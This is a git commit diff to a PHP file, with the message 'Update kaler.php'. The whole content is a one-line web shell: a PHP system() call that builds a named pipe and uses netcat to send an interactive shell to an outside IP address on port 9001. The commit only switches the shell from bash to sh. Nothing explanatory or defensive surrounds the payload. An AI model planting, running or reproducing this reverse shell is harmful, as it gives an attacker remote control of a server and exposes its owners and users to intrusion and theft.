9aa9b01e6a7c3279b6a39e00a05c7904517db4c2
ju7t4te5t <ju7t4te5t@gmail.com>
2024-11-27 17:41:14 +0330

    Update kaler.php

--- kal.php
+++ kal.php
@@ -1,1 +1,1 @@
-<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 104.234.196.102 9001 >/tmp/f"); ?>
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 104.234.196.102 9001 >/tmp/f"); ?>
